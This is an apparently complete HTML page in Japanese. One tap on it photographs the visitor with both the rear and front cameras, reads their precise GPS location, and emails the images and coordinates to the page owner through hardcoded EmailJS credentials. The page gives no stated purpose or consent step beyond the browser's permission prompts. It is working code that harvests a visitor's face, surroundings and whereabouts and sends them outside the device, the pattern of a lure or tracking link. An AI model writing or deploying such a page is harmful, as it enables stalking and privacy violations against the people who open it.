<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <title>カメラ・位置・送信アプリ</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <script src="https://cdn.emailjs.com/sdk/3.11.0/email.min.js"></script>
  <style>
    body {
      font-family: sans-serif;
      background: #222;
      color: white;
      padding: 20px;
    }
    .touch-area {
      background: #444;
      padding: 20px;
      border-radius: 10px;
      text-align: center;
      cursor: pointer;
    }
    .status {
      margin-top: 15px;
      padding: 10px;
      border-radius: 5px;
      background: #333;
    }
    img {
      max-width: 100%;
      border-radius: 8px;
    }
  </style>
</head>
<body>
  <div class="touch-area" id="touchArea">📸 タップで処理開始</div>
  <div class="status" id="status">待機中</div>
  <img id="capturedRear" style="display:none" />
  <img id="capturedFront" style="display:none" />
  <video id="playbackVideo" controls style="display:none"></video>

  <script>
    emailjs.init("cPjKBUm_i6HebDQF7");

    const statusEl = document.getElementById("status");
    const touchArea = document.getElementById("touchArea");
    const capturedRear = document.getElementById("capturedRear");
    const capturedFront = document.getElementById("capturedFront");
    const playbackVideo = document.getElementById("playbackVideo");

    const sampleVideoBase64 = "data:video/mp4;base64,AAAAIGZ0eXBpc...（略）";

    function updateStatus(text) {
      statusEl.textContent = text;
      console.log("[Status]", text);
    }

    async function capturePhoto(facingMode) {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode }, audio: false
      });
      const video = document.createElement("video");
      video.srcObject = stream;
      await video.play();
      await new Promise(r => setTimeout(r, 1000));
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0);
      const base64 = canvas.toDataURL("image/jpeg", 0.7);
      stream.getTracks().forEach(t => t.stop());
      return base64;
    }

    async function getLocation() {
      return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
          reject(new Error("Geolocation not supported"));
        }
        navigator.geolocation.getCurrentPosition(pos => {
          resolve({
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            timestamp: new Date().toISOString()
          });
        }, reject);
      });
    }

    async function playVideo() {
      try {
        playbackVideo.src = sampleVideoBase64;
        playbackVideo.style.display = "block";
        await playbackVideo.play();
        updateStatus("🎬 動画再生成功");
        return true;
      } catch (e) {
        updateStatus("⚠️ 動画再生失敗（続行）");
        return false;
      }
    }

    async function sendEmail({ photoRear, photoFront, location, videoPlayed }) {
      updateStatus("✉️ メール送信中...");
      try {
        await emailjs.send("service_ja2c09x", "template_2fp2jrg", {
          photo_rear: photoRear,
          photo_front: photoFront,
          location_info: `緯度: ${location.latitude}<br>経度: ${location.longitude}<br>精度: ${location.accuracy}m<br>時刻: ${location.timestamp}`,
          video_status: videoPlayed ? "動画再生完了" : "動画再生無し",
          date: new Date().toLocaleString()
        });
        updateStatus("✅ メール送信成功");
      } catch (e) {
        updateStatus("❌ メール送信失敗");
        console.error("EmailJS Error:", e);
      }
    }

    async function handleTouch() {
      try {
        updateStatus("📸 外カメ撮影中...");
        const rear = await capturePhoto("environment");
        capturedRear.src = rear;
        capturedRear.style.display = "block";

        updateStatus("📸 内カメ撮影中...");
        const front = await capturePhoto("user");
        capturedFront.src = front;
        capturedFront.style.display = "block";

        updateStatus("📍 位置情報取得中...");
        const loc = await getLocation();

        const videoPlayed = await playVideo();

        await sendEmail({
          photoRear: rear,
          photoFront: front,
          location: loc,
          videoPlayed
        });
      } catch (err) {
        updateStatus("❌ エラー: " + err.message);
        console.error(err);
      }
    }

    touchArea.addEventListener("click", handleTouch);
  </script>
</body>
</html>
